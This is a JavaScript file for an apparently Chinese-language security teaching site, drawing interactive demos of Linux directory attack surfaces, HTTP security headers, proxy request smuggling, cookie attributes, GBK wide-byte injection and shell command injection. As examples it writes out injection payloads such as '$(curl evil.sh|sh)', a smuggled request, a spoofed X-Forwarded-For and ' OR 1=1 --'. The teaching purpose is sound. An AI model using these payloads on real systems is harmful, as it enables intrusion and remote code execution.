/* ================================================================
   SEC·ATLAS · viz-l1b.js
   L1 补充章节的可视化：
     §06 FHSViz        目录地图（FHS）
     §08 HeaderLabViz  HTTP 安全响应头实验台
     §09 ProxyChainViz 代理链路 / XFF / 请求走私 / 路径穿越
     §11 CookieLabViz  Cookie 属性 × 攻击场景
     §12 EncodingLabViz 字符编码对照 / 宽字节 / 同形字
     §13 ShellInjectViz 命令拼接注入实验台
   依赖: utils.js（$, $$）、theme.js（PAL）
   ================================================================ */
"use strict";

/* ================= §06 FHS 目录地图 ================= */
const FHS_DATA = [
  { p:"etc/", risk:"hot", use:"系统与服务的配置文件",
    bad:"权限错配直接导致凭据泄露；配置文件里常存明文口令与密钥",
    files:"passwd · shadow（须 640 root:shadow）· sudoers · ssh/sshd_config" },
  { p:"etc/systemd/system/", risk:"hot", use:"管理员自定义 unit",
    bad:"新建 .service / .timer 是首选持久化手法，排查最易漏",
    files:"ExecStart 指向 /tmp、/dev/shm 或编码命令 = 高度可疑" },
  { p:"var/spool/cron/", risk:"hot", use:"用户级定时任务",
    bad:"crontab -e 写入；cron 的 PATH 很短，可被 PATH 劫持",
    files:"cron/<user> · /etc/crontab · /etc/cron.d/ · cron.{hourly,daily}" },
  { p:"var/log/", risk:"hot", use:"日志文件",
    bad:"攻击者常在此清理痕迹；本地日志 root 可清空 → 必须转发远端",
    files:"auth.log / secure · syslog · wtmp / btmp（二进制，用 last / lastb）" },
  { p:"home/", risk:"amb", use:"普通用户家目录",
    bad:"SSH 私钥、命令历史、脚本 —— 横向移动的素材库",
    files:".ssh/id_rsa · .bash_history · .bashrc（登录即执行的持久化点）" },
  { p:"root/", risk:"amb", use:"root 家目录",
    bad:"默认 700；一旦可读，等于全盘失守",
    files:".ssh · .bash_history · 运维脚本（常含硬编码凭据）" },
  { p:"tmp/ · var/tmp/", risk:"hot", use:"临时目录",
    bad:"全局可写 → 恶意文件落地与提权的常见位置",
    files:"需配合 Sticky Bit（1777）限制删除；常与 /dev/shm 一起查" },
  { p:"bin/ · sbin/ · usr/bin/", risk:"hot", use:"可执行程序",
    bad:"SUID 程序集中地，提权排查的第一现场",
    files:"find / -perm -4000 -type f 2>/dev/null → 对照 GTFOBins" },
  { p:"proc/", risk:"amb", use:"内核与进程的虚拟文件系统",
    bad:"可读进程内存映射、命令行、环境变量（常含数据库口令、API Key）",
    files:"<PID>/exe（显示 (deleted) = 无文件攻击）· cmdline · environ" },
  { p:"dev/shm/", risk:"hot", use:"共享内存设备",
    bad:"无文件攻击的内存落地目录，重启即消失，取证极易漏",
    files:"与 /tmp 一样属于「可写且不留磁盘痕迹」的位置" },
  { p:"opt/ · srv/", risk:"amb", use:"第三方软件与服务数据",
    bad:"权限往往疏于管理；Web 根目录常在此，直接暴露源码与备份",
    files:"备份文件（.zip / .sql）比漏洞更好用" },
];

class FHSViz{
  constructor(){
    this.body = $("#fhsBody");
    this.hotOnly = false;
    this.sel = 0;
    this.render();
    this.body.onclick = e => {
      const row = e.target.closest("[data-fhs]");
      if(row){ this.sel = +row.dataset.fhs; this.render(); }
    };
    const btn = $("#fhsHot");
    if(btn) btn.onclick = () => {
      this.hotOnly = !this.hotOnly;
      btn.textContent = this.hotOnly ? "显示全部" : "只看高危";
      this.render();
    };
  }
  render(){
    const rows = FHS_DATA.map((d,i) => ({...d, i}))
      .filter(d => !this.hotOnly || d.risk === "hot");
    if(!rows.some(d => d.i === this.sel)) this.sel = rows[0] ? rows[0].i : 0;
    const cur = FHS_DATA[this.sel];
    const tree = rows.map((d, k) => {
      const last = k === rows.length - 1;
      return `<div class="fhs-row ${d.risk} ${d.i === this.sel ? "on" : ""}" data-fhs="${d.i}">
        <span class="fhs-br">${last ? "└─" : "├─"}</span>
        <span class="fhs-p">${d.p}</span>
        <span class="fhs-dot"></span>
      </div>`;
    }).join("");

    this.body.innerHTML = `
      <div class="fhs-wrap">
        <div class="fhs-tree">
          <div class="fhs-root"><span class="fhs-sl">/</span><span class="fhs-rt">FHS 根</span></div>
          ${tree}
          <div class="legend">
            <span class="li"><span class="sq" style="background:var(--red)"></span>高频攻击面</span>
            <span class="li"><span class="sq" style="background:var(--amb)"></span>重点核对</span>
          </div>
        </div>
        <div class="fhs-detail">
          <div class="fhs-d-path">/${cur.p.replace(/\/$/, "")}</div>
          <div class="fhs-d-row"><span class="k">用途</span><span class="v">${cur.use}</span></div>
          <div class="fhs-d-row"><span class="k">安全关注</span><span class="v bad">${cur.bad}</span></div>
          <div class="fhs-d-row"><span class="k">典型文件</span><span class="v mono">${cur.files}</span></div>
        </div>
      </div>`;
  }
}

/* ================= §08 HTTP 安全响应头 ================= */
const HDR_DEFS = [
  { id:"hsts", name:"Strict-Transport-Security", val:"max-age=63072000; includeSubDomains",
    what:"强制后续只用 HTTPS，防降级", hole:"SSL Stripping：中间人把 https 降成 http，明文长期监听" },
  { id:"csp", name:"Content-Security-Policy", val:"default-src 'self'; script-src 'self'",
    what:"限制可加载/执行的资源来源", hole:"任意 XSS 载荷可直接执行 → 会话劫持、键盘记录" },
  { id:"xfo", name:"X-Frame-Options", val:"DENY",
    what:"禁止被 iframe 嵌套", hole:"点击劫持：透明 iframe 覆盖按钮，诱导用户点「删除」" },
  { id:"nosniff", name:"X-Content-Type-Options", val:"nosniff",
    what:"禁止浏览器嗅探 MIME", hole:"上传的 .jpg 里藏 HTML/JS，被当作页面执行" },
  { id:"ref", name:"Referrer-Policy", val:"strict-origin-when-cross-origin",
    what:"控制 Referer 泄露多少", hole:"URL 里的 token / 内部路径经 Referer 泄给第三方" },
  { id:"cookie", name:"Set-Cookie", val:"sid=…; HttpOnly; Secure; SameSite=Lax",
    what:"会话 Cookie 的三重约束", hole:"XSS 直接读走 Cookie、明文传输被截获、跨站请求被携带" },
  { id:"cors", name:"Access-Control-Allow-Origin", val:"https://app.example.com",
    what:"跨域白名单", hole:"配置过宽 → 任意站点带 Cookie 读取用户数据" },
];

class HeaderLabViz{
  constructor(){
    this.body = $("#hdrBody");
    this.on = {};
    HDR_DEFS.forEach(d => this.on[d.id] = true);
    this.render();
    this.body.onclick = e => {
      const t = e.target.closest("[data-hdr]");
      if(!t) return;
      this.on[t.dataset.hdr] = !this.on[t.dataset.hdr];
      this.render();
    };
    const all = $("#hdrAll"), none = $("#hdrNone");
    if(all) all.onclick = () => { HDR_DEFS.forEach(d => this.on[d.id] = true); this.render(); };
    if(none) none.onclick = () => { HDR_DEFS.forEach(d => this.on[d.id] = false); this.render(); };
  }
  render(){
    const n = HDR_DEFS.filter(d => this.on[d.id]).length;
    const pct = Math.round(n / HDR_DEFS.length * 100);
    const col = pct === 100 ? "var(--grn)" : pct >= 50 ? "var(--amb)" : "var(--red)";
    const holes = HDR_DEFS.filter(d => !this.on[d.id]);
    const lines = HDR_DEFS.filter(d => this.on[d.id])
      .map(d => `<div class="hl"><span class="hn">${d.name}:</span> <span class="hv">${d.val}</span></div>`).join("");

    this.body.innerHTML = `
      <div class="hdr-wrap">
        <div class="hdr-list">
          ${HDR_DEFS.map(d => `
            <div class="hdr-row ${this.on[d.id] ? "on" : ""}" data-hdr="${d.id}">
              <span class="hdr-sw"><i></i></span>
              <span class="hdr-meta"><b>${d.name}</b><em>${d.what}</em></span>
            </div>`).join("")}
        </div>
        <div class="hdr-right">
          <div class="hdr-score">防线完整度 <b style="color:${col}">${n}/${HDR_DEFS.length}</b>
            <div class="hdr-bar"><i style="width:${pct}%;background:${col}"></i></div>
          </div>
          <div class="hdr-code">
            <div class="hc-t">HTTP/1.1 200 OK</div>
            ${lines || `<div class="hc-empty">（没有任何安全响应头）</div>`}
          </div>
          <div class="hdr-holes">
            ${holes.length
              ? holes.map(d => `<div class="hole"><span class="x">✕</span><span>缺 <b>${d.name.split(":")[0]}</b> → ${d.hole}</span></div>`).join("")
              : `<div class="hole ok"><span class="x">✓</span><span>七类浏览器侧风险全部覆盖。注意：<b>这只挡住浏览器侧</b>，服务端校验仍是根本。</span></div>`}
          </div>
        </div>
      </div>`;
  }
}

/* ================= §09 代理链路 ================= */
const PROXY_MODES = {
  normal: {
    focus: -1,
    verdict: ["一致", "每一层都用同一套规则解析，请求边界没有歧义 —— 这是正常情况。"],
    front: ["POST /login HTTP/1.1", "Host: shop.example.com", "Content-Length: 20", "", "user=alice&pass=1234"],
    back:  ["POST /login HTTP/1.1", "Host: shop.example.com", "Content-Length: 20", "", "user=alice&pass=1234"],
  },
  xff: {
    focus: 1,
    verdict: ["信任错位", "应用把 XFF 的第一个值当客户端 IP。攻击者自己塞一个进去，白名单与限流同时失效。"],
    front: ["GET /admin HTTP/1.1", "Host: shop.example.com",
            "X-Forwarded-For: 127.0.0.1", "Cookie: sid=…"],
    back:  ["# 应用代码", "ip = request.headers['X-Forwarded-For'].split(',')[0]",
            "if ip.startswith('127.'):  grant_admin()", "",
            "→ ip = \"127.0.0.1\"   判定通过"],
  },
  smuggle: {
    focus: 2,
    verdict: ["边界错位", "前端按 Content-Length=6 判定请求结束，后端按 chunked 继续读 —— 剩下的字节成了后端队列里的下一个请求。"],
    front: ["POST / HTTP/1.1", "Host: shop.example.com", "Content-Length: 6",
            "Transfer-Encoding: chunked", "", "0", "", "GET /admin HTTP/1.1"],
    back:  ["① POST /  （chunked，读到 0 即结束）",
            "② GET /admin HTTP/1.1   ← 攻击者写的",
            "", "# 后果：下一个正常用户的请求",
            "# 会被拼在这个 /admin 请求之后执行"],
  },
  path: {
    focus: 2,
    verdict: ["规则错位", "代理按前缀放行 /static/，后端再规范化 —— 放行的是一个静态请求，执行的是一个管理请求。"],
    front: ["GET /static/../admin/users HTTP/1.1", "Host: shop.example.com", "",
            "# 代理规则：if path.startswith('/static/') → 放行"],
    back:  ["# 后端规范化之后", "GET /admin/users HTTP/1.1", "",
            "→ 命中管理接口，且未经过 WAF 检查"],
  },
};

class ProxyChainViz{
  constructor(){
    this.body = $("#proxyBody");
    this.mode = "normal";
    this.render();
    this.body.onclick = e => {
      const b = e.target.closest("[data-mode]");
      if(!b) return;
      this.mode = b.dataset.mode;
      $$("#proxySeg .seg-btn").forEach(x => x.classList.toggle("active", x.dataset.mode === this.mode));
      this.render();
    };
    const seg = $("#proxySeg");
    if(seg) seg.onclick = e => {
      const b = e.target.closest("[data-mode]");
      if(!b) return;
      this.mode = b.dataset.mode;
      $$("#proxySeg .seg-btn").forEach(x => x.classList.toggle("active", x.dataset.mode === this.mode));
      this.render();
    };
  }
  render(){
    const m = PROXY_MODES[this.mode];
    const bad = this.mode !== "normal";
    const nodes = [
      ["客户端", "攻击者 / 浏览器"],
      ["CDN · WAF", "边缘解析"],
      ["反向代理", "二次解析"],
      ["应用", "信任前层"],
    ];
    const code = arr => arr.map(l => l.startsWith("#")
      ? `<div class="pl cm">${l}</div>`
      : `<div class="pl ${l === "" ? "blank" : ""}">${l || "&nbsp;"}</div>`).join("");

    this.body.innerHTML = `
      <div class="pxy-chain">
        ${nodes.map((n, i) => `
          ${i ? `<div class="pxy-arrow ${m.focus >= i ? "hot" : ""}"><i></i></div>` : ""}
          <div class="pxy-node ${i === m.focus ? "hot" : ""}">
            <div class="pn-n">${n[0]}</div><div class="pn-s">${n[1]}</div>
          </div>`).join("")}
      </div>
      <div class="pxy-cmp">
        <div class="pxy-col">
          <div class="pc-h">前端看到的内容</div>
          <div class="pc-code">${code(m.front)}</div>
        </div>
        <div class="pxy-col">
          <div class="pc-h ${bad ? "bad" : ""}">后端实际处理的</div>
          <div class="pc-code">${code(m.back)}</div>
        </div>
      </div>
      <div class="pxy-verdict"><span class="pv-k">${m.verdict[0]}</span><span>${m.verdict[1]}</span></div>`;
  }
}

/* ================= §11 Cookie 实验台 ================= */
class CookieLabViz{
  constructor(){
    this.body = $("#cookieBody");
    this.attrs = { httpOnly:true, secure:true, same:"Lax" };
    this.render();
    this.body.onclick = e => {
      const t = e.target.closest("[data-ck]");
      if(!t) return;
      const k = t.dataset.ck;
      if(k === "httpOnly") this.attrs.httpOnly = !this.attrs.httpOnly;
      else if(k === "secure") this.attrs.secure = !this.attrs.secure;
      else this.attrs.same = t.dataset.v;
      this.render();
    };
    const r = $("#cookieReset");
    if(r) r.onclick = () => { this.attrs = { httpOnly:true, secure:true, same:"Lax" }; this.render(); };
  }
  scenarios(){
    const a = this.attrs;
    const list = [];
    /* 1. XSS 读 Cookie */
    list.push({
      t:"XSS 注入", q:"document.cookie 能读到 sid 吗？",
      safe: a.httpOnly,
      ok:"HttpOnly 生效：脚本读不到，会话不能被直接偷走（但页面仍可被改）",
      bad:"sid 被 JS 直接读走 → 攻击者拿着 Cookie 就能冒充登录",
    });
    /* 2. 明文传输 */
    list.push({
      t:"中间人 / 明文 HTTP", q:"请求会带着 sid 走明文吗？",
      safe: a.secure,
      ok:"Secure 生效：浏览器只在 HTTPS 下携带该 Cookie",
      bad:"Cookie 随明文请求发出 → 同网段可被直接截获",
    });
    /* 3. 跨站 POST（CSRF） */
    list.push({
      t:"跨站 POST 表单（CSRF）", q:"第三方页面自动提交表单时带 Cookie 吗？",
      safe: a.same !== "None",
      ok:"SameSite=" + a.same + "：跨站 POST 不携带 Cookie，请求变成未登录状态",
      bad:"SameSite=None：跨站请求照样带上 Cookie → CSRF 成立，用户被动执行操作",
    });
    /* 4. 跨站顶层 GET 导航 */
    list.push({
      t:"跨站顶层 GET 导航", q:"点别人发来的链接跳转过来时带 Cookie 吗？",
      safe: a.same === "Strict",
      ok:"SameSite=Strict：连顶层导航都不带 Cookie，最严格（代价是外链进来会显示未登录）",
      bad:"SameSite=" + a.same + "：顶层 GET 导航会携带 Cookie —— 所以 GET 接口绝不能做写操作",
    });
    return list;
  }
  render(){
    const a = this.attrs;
    const line = `sid=8f3a…; Path=/; ${a.httpOnly ? "HttpOnly; " : ""}${a.secure ? "Secure; " : ""}SameSite=${a.same}`;
    const sc = this.scenarios();
    const safeN = sc.filter(s => s.safe).length;

    this.body.innerHTML = `
      <div class="ck-wrap">
        <div class="ck-left">
          <div class="ck-code"><span class="hn">Set-Cookie:</span> ${line}</div>
          <div class="ck-attrs">
            <div class="ck-row ${a.httpOnly ? "on" : ""}" data-ck="httpOnly">
              <span class="hdr-sw"><i></i></span><span><b>HttpOnly</b><em>JS 不可读（document.cookie 看不到）</em></span>
            </div>
            <div class="ck-row ${a.secure ? "on" : ""}" data-ck="secure">
              <span class="hdr-sw"><i></i></span><span><b>Secure</b><em>仅在 HTTPS 下携带</em></span>
            </div>
            <div class="ck-same">
              <span class="ck-lab">SameSite</span>
              <div class="seg">
                ${["Strict","Lax","None"].map(v => `<button class="seg-btn ${a.same === v ? "active" : ""}" data-ck="same" data-v="${v}">${v}</button>`).join("")}
              </div>
            </div>
          </div>
          <div class="ck-sum">四类场景中已挡住 <b style="color:${safeN === 4 ? "var(--grn)" : safeN >= 2 ? "var(--amb)" : "var(--red)"}">${safeN}/4</b></div>
        </div>
        <div class="ck-right">
          ${sc.map(s => `
            <div class="ck-sc ${s.safe ? "ok" : "bad"}">
              <div class="cs-t"><span class="cs-x">${s.safe ? "✓" : "✕"}</span>${s.t}</div>
              <div class="cs-q">${s.q}</div>
              <div class="cs-a">${s.safe ? s.ok : s.bad}</div>
            </div>`).join("")}
        </div>
      </div>`;
  }
}

/* ================= §12 字符编码 ================= */
/* 少量 GBK 码位（够演示用，不追求完整码表） */
const GBK_MAP = {
  "中":[0xD6,0xD0], "文":[0xCE,0xC4], "国":[0xB9,0xFA], "安":[0xB0,0xB2],
  "全":[0xC8,0xAB], "字":[0xD7,0xD6], "a":[0x61], "'":[0x27], "<":[0x3C], ">":[0x3E],
  " ":[0x20], "é":[0xA8,0xA6],
};
const hex = b => b.map(x => x.toString(16).toUpperCase().padStart(2, "0")).join(" ");

class EncodingLabViz{
  constructor(){
    this.body = $("#encBody");
    this.mode = "table";
    this.ch = "中";
    this.render();
    const seg = $("#encSeg");
    if(seg) seg.onclick = e => {
      const b = e.target.closest("[data-mode]");
      if(!b) return;
      this.mode = b.dataset.mode;
      $$("#encSeg .seg-btn").forEach(x => x.classList.toggle("active", x.dataset.mode === this.mode));
      this.render();
    };
    this.body.onclick = e => {
      const c = e.target.closest("[data-ch]");
      if(c){ this.ch = c.dataset.ch; this.render(); }
    };
  }
  bytes(){
    const ch = this.ch;
    const utf8 = Array.from(new TextEncoder().encode(ch));
    const u16 = [];
    for(let i = 0; i < ch.length; i++){ const c = ch.charCodeAt(i); u16.push(c & 0xff, c >> 8); }
    const gbk = GBK_MAP[ch] || null;
    return { utf8, u16, gbk };
  }
  render(){
    if(this.mode === "table") this.renderTable();
    else if(this.mode === "wide") this.renderWide();
    else this.renderHomo();
  }
  renderTable(){
    const { utf8, u16, gbk } = this.bytes();
    const cp = this.ch.codePointAt(0);
    const b64 = (() => { try{ return btoa(String.fromCharCode(...utf8)); }catch(e){ return "—"; } })();
    const url = utf8.map(b => "%" + b.toString(16).toUpperCase().padStart(2, "0")).join("");
    const rows = [
      ["UTF-8", hex(utf8) + (utf8.length > 1 ? `　（${utf8.length} 字节 · 变长）` : "　（1 字节 · 兼容 ASCII）"), "Web 默认编码"],
      ["GBK", gbk ? hex(gbk) + "　（2 字节）" : "—　（示例码表外）", "中文双字节，宽字节注入的成因"],
      ["UTF-16LE", hex(u16), "Windows 内部；PowerShell -EncodedCommand"],
      ["URL 编码", url, "WAF 只解一层时可用多重编码绕过"],
      ["Base64", b64, "只是编码，不是加密"],
      ["HTML 实体", `&amp;#x${cp.toString(16).toUpperCase()};`, "XSS 上下文绕过"],
      ["码点", `U+${cp.toString(16).toUpperCase().padStart(4, "0")}`, `字符「${this.ch}」`],
    ];
    this.body.innerHTML = `
      <div class="enc-in">
        <input id="encInput" class="enc-input" maxlength="2" value="${this.ch.replace(/"/g, "&quot;")}" spellcheck="false">
        <div class="enc-chips">
          ${["中","文","'","<","é","a"].map(c => `<button class="enc-chip ${c === this.ch ? "on" : ""}" data-ch="${c}">${c}</button>`).join("")}
        </div>
        <span class="enc-tip">输入单个字符，或点选示例</span>
      </div>
      <div class="enc-tbl">
        ${rows.map(r => `<div class="enc-r"><span class="er-k">${r[0]}</span><span class="er-v">${r[1]}</span><span class="er-n">${r[2]}</span></div>`).join("")}
      </div>`;
    const inp = $("#encInput");
    if(inp){
      inp.oninput = () => {
        const v = (inp.value || "").slice(0, 2);
        if(!v) return;
        this.ch = v;
        this.render();
        const again = $("#encInput");
        if(again){ again.focus(); again.setSelectionRange(again.value.length, again.value.length); }
      };
    }
  }
  renderWide(){
    this.body.innerHTML = `
      <div class="enc-flow">
        <div class="ef-step">
          <div class="ef-n">① 攻击者输入</div>
          <div class="ef-v mono">%df%27</div>
          <div class="ef-d">单引号（0x27），前面垫一个高位字节 0xDF</div>
        </div>
        <div class="ef-arrow">→</div>
        <div class="ef-step">
          <div class="ef-n">② 应用转义</div>
          <div class="ef-v mono">%df<span class="bad">%5c</span>%27</div>
          <div class="ef-d">转义函数在单引号前补 0x5C（反斜杠）</div>
        </div>
        <div class="ef-arrow">→</div>
        <div class="ef-step hot">
          <div class="ef-n">③ GBK 解码</div>
          <div class="ef-v mono">[DF 5C] = 一个汉字</div>
          <div class="ef-d">0x5C 被"吃掉"，单引号重新裸露</div>
        </div>
        <div class="ef-arrow">→</div>
        <div class="ef-step bad">
          <div class="ef-n">④ SQL 解析</div>
          <div class="ef-v mono">' OR 1=1 --</div>
          <div class="ef-d">转义失效 → 注入成立</div>
        </div>
      </div>
      <div class="enc-note2">
        <b>为什么只在 GBK 这类双字节编码下成立：</b>UTF-8 的续字节范围是 <code>0x80–0xBF</code>，<code>0x5C</code> 永远不可能是某个字符的组成部分；
        而 GBK 的第二字节可以是 <code>0x40–0xFE</code>，正好覆盖 <code>0x5C</code>。
        <b>防御</b>：全链路统一 UTF-8（连接、表、页面、文件），并使用参数化查询 —— 编码问题不该由转义函数来兜底。
      </div>`;
  }
  renderHomo(){
    this.body.innerHTML = `
      <div class="homo-wrap">
        <div class="homo-card">
          <div class="hc-url">www.<b>a</b>pple.com</div>
          <div class="hc-cp">U+0061 · LATIN SMALL LETTER A</div>
          <div class="hc-tag ok">真实站点</div>
        </div>
        <div class="homo-vs">看起来<br>一模一样</div>
        <div class="homo-card bad">
          <div class="hc-url">www.<b>а</b>pple.com</div>
          <div class="hc-cp">U+0430 · CYRILLIC SMALL LETTER A</div>
          <div class="hc-tag bad">钓鱼站点</div>
        </div>
      </div>
      <div class="enc-note2">
        <b>同形字（Homograph）：</b>Unicode 里存在大量"字形相同、码点不同"的字符，西里尔字母 <code>а</code> 与拉丁字母 <code>a</code> 是最经典的例子。
        地址栏、证书主题、邮件发件人里都可能出现，肉眼几乎无法分辨。
        <b>防御</b>：浏览器已对混合脚本域名做 punycode 提示（<code>xn--…</code>）；企业侧应做域名监控，并对证书主体做同形字检查。
      </div>`;
  }
}

/* ================= §13 命令拼接 ================= */
class ShellInjectViz{
  constructor(){
    this.body = $("#shBody");
    this.mode = "bad";
    this.name = "report.txt";
    this.render();
    const seg = $("#shSeg");
    if(seg) seg.onclick = e => {
      const b = e.target.closest("[data-mode]");
      if(!b) return;
      this.mode = b.dataset.mode;
      $$("#shSeg .seg-btn").forEach(x => x.classList.toggle("active", x.dataset.mode === this.mode));
      this.render();
    };
    this.body.onclick = e => {
      const p = e.target.closest("[data-pre]");
      if(p){ this.name = p.dataset.pre; this.render(); }
    };
  }
  analyze(){
    const n = this.name;
    const metas = [";", "&&", "||", "|", "$(", "`", ">", "<", "\n"];
    let cut = -1, mk = "";
    for(const m of metas){
      const i = n.indexOf(m);
      if(i >= 0 && (cut < 0 || i < cut)){ cut = i; mk = m; }
    }
    return { cut, mk, injected: cut >= 0 ? n.slice(cut) : "" };
  }
  render(){
    const n = this.name;
    const a = this.analyze();
    const cmd = "cat " + n;
    const codeMap = {
      bad:  `<span class="kw">import</span> os\nos.system(<span class="st">"cat "</span> + name)`,
      mid:  `<span class="kw">import</span> subprocess\nsubprocess.run(<span class="st">"cat "</span> + name, shell=<span class="kw">True</span>)`,
      good: `<span class="kw">import</span> subprocess\nsubprocess.run([<span class="st">"cat"</span>, name])   <span class="cm"># 数组，无 shell</span>`,
    };
    const dangerous = this.mode !== "good" && a.cut >= 0;
    const shown = dangerous
      ? `cat ${n.slice(0, a.cut)}<span class="inj">${n.slice(a.cut)}</span>`
      : `cat ${n.replace(/</g, "&lt;")}`;

    let verdict;
    if(this.mode === "good"){
      verdict = `<div class="sh-v ok"><b>✓ 安全</b>参数以数组传递，<code>${n.replace(/</g, "&lt;")}</code> 整体是 <b>一个参数</b>，shell 不参与解析 —— 分号、管道、$() 都只是文件名的一部分。</div>`;
    }else if(!dangerous){
      verdict = `<div class="sh-v warn"><b>· 当前输入无害</b>但只要有人把文件名改成 <code>a.txt; id</code>，这条命令就变成了两条。危险的不是这次输入，是这条拼接路径。</div>`;
    }else{
      verdict = `<div class="sh-v bad"><b>✕ 注入成立</b>shell 看到 <code>${a.mk}</code> 就把命令切开：第一条 <code>cat ${n.slice(0, a.cut)}</code>，第二条 <code>${a.injected.replace(/</g, "&lt;")}</code> 直接以应用进程的权限执行。</div>`;
    }

    this.body.innerHTML = `
      <div class="sh-wrap">
        <div class="sh-in">
          <span class="sh-lab">用户可控的文件名</span>
          <input id="shInput" class="enc-input sh-input" value="${n.replace(/"/g, "&quot;")}" spellcheck="false">
          <div class="enc-chips">
            ${["report.txt", "a.txt; id", "$(curl evil.sh|sh)", "a.txt && whoami"].map(p =>
              `<button class="enc-chip ${p === n ? "on" : ""}" data-pre="${p.replace(/"/g, "&quot;")}">${p.replace(/</g, "&lt;")}</button>`).join("")}
          </div>
        </div>
        <div class="sh-code">${codeMap[this.mode].replace(/\n/g, "<br>")}</div>
        <div class="sh-built">
          <span class="sb-k">实际执行的命令行</span>
          <div class="sb-v">${shown}</div>
        </div>
        ${verdict}
      </div>`;

    const inp = $("#shInput");
    if(inp){
      inp.oninput = () => {
        this.name = inp.value;
        this.render();
        const again = $("#shInput");
        if(again){ again.focus(); again.setSelectionRange(again.value.length, again.value.length); }
      };
    }
  }
}
